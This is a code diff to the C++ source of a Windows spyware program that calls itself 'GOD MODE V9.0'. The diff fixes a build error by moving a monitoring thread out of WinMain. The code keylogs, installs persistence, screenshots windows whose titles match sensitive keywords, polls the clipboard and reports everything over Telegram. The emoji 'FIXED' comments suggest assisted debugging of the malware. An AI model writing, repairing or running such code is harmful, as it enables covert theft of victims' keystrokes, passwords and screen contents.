@@ -79,6 +79,52 @@ void MonitorForeground();
 void CheckClipboard();
 std::wstring GetClipboardText();
 
+// 🔥 FIXED: Move MonitorForegroundLoop function definition OUTSIDE WinMain
+DWORD WINAPI MonitorForegroundLoop(LPVOID lpParam) {
+    while (true) {
+        HWND foreground = GetForegroundWindow();
+        if (foreground) {
+            // Monitor foreground window
+            wchar_t title[512] = {0}, className[256] = {0};
+            GetWindowTextW(foreground, title, 512);
+            GetClassNameW(foreground, className, 256);
+            
+            // Check if this window should trigger screenshot
+            bool trigger = false;
+            for (int i = 0; CRITICAL_KEYWORDS[i]; i++) {
+                if (wcsstr(title, CRITICAL_KEYWORDS[i]) || wcsstr(className, CRITICAL_KEYWORDS[i])) {
+                    trigger = true;
+                    break;
+                }
+            }
+            
+            // Also check for critical window classes
+            for (int i = 0; CRITICAL_CLASSES[i]; i++) {
+                if (wcsstr(className, CRITICAL_CLASSES[i])) {
+                    trigger = true;
+                    break;
+                }
+            }
+            
+            if (trigger && (GetTickCount64() - last_trigger > 30000) && screenshot_count < 20) {
+                std::wstring status = L"🎯 GOD MODE HIT: " + std::wstring(title, wcslen(title)) + L" (" + std::wstring(className, wcslen(className)) + L")";
+                SendTelegramMessage(status);
+                
+                if (TakeScreenshot()) {
+                    screenshot_count++;
+                    last_trigger = GetTickCount64();
+                    SendTelegramMessage(L"📸 CAPTURED #" + std::to_wstring(screenshot_count) + L" + LIVE KEYLOG ACTIVE");
+                }
+            }
+        }
+        
+        // Also check clipboard every loop
+        CheckClipboard();
+        Sleep(1000); // Check every second
+    }
+    return 0;
+}
+
 int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
     DisableThreadLibraryCalls(hInstance);
     
@@ -93,21 +139,7 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
     SendTelegramMessage(L"🔥 GOD MODE V9.0 ACTIVATED - FULL KEYLOGGING + SCREEN CAPTURE");
     InstallPersistence();
     
-    // Monitor + screenshot thread
-    
-    // Add this function before the line that uses MonitorForegroundLoop
-void MonitorForegroundLoop() {
-    // Your implementation here
-    while (true) {
-        // Monitor foreground window logic
-        HWND foreground = GetForegroundWindow();
-        if (foreground) {
-            // Do something with the foreground window
-            // ...
-        }
-        Sleep(1000); // Check every second
-    }
-}
+    // 🔥 FIXED: Create thread with the CORRECT function
     CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)MonitorForegroundLoop, NULL, 0, NULL);
     
     // Message loop for hook
@@ -121,14 +153,6 @@ void MonitorForegroundLoop() {
     
     UnhookWindowsHookEx(keyHook);
     DeleteCriticalSection(&cs);
-    return 0;
-}
-
-DWORD WINAPI MonitorForegroundLoop(LPVOID lpParam) {
-    while (god_mode_active) {
-        CheckClipboard();
-        Sleep(2000);
-    }
     return 0;
 }
 
@@ -191,38 +215,7 @@ bool TakeScreenshot() {
 }
 
 void MonitorForeground() {
-    EnterCriticalSection(&cs);
-    if (GetTickCount64() - last_trigger < 30000 || screenshot_count >= 20) {
-        LeaveCriticalSection(&cs);
-        return;
-    }
-    
-    HWND fg = GetForegroundWindow();
-    if (!fg) { LeaveCriticalSection(&cs); return; }
-    
-    wchar_t title[512] = {0}, className[256] = {0};
-    GetWindowTextW(fg, title, 512);
-    GetClassNameW(fg, className, 256);
-    
-    bool trigger = false;
-    for (int i = 0; CRITICAL_KEYWORDS[i]; i++) {
-        if (wcsstr(title, CRITICAL_KEYWORDS[i]) || wcsstr(className, CRITICAL_KEYWORDS[i])) {
-            trigger = true;
-            break;
-        }
-    }
-    
-    if (trigger) {
-        std::wstring status = L"🎯 GOD MODE HIT: " + std::wstring(title, wcslen(title)) + L" (" + std::wstring(className, wcslen(className)) + L")";
-        SendTelegramMessage(status);
-        
-        if (TakeScreenshot()) {
-            screenshot_count++;
-            last_trigger = GetTickCount64();
-            SendTelegramMessage(L"📸 CAPTURED #" + std::to_wstring(screenshot_count) + L" + LIVE KEYLOG ACTIVE");
-        }
-    }
-    LeaveCriticalSection(&cs);
+    // This function is not used anymore, replaced by MonitorForegroundLoop
 }
 
 void CheckClipboard() {
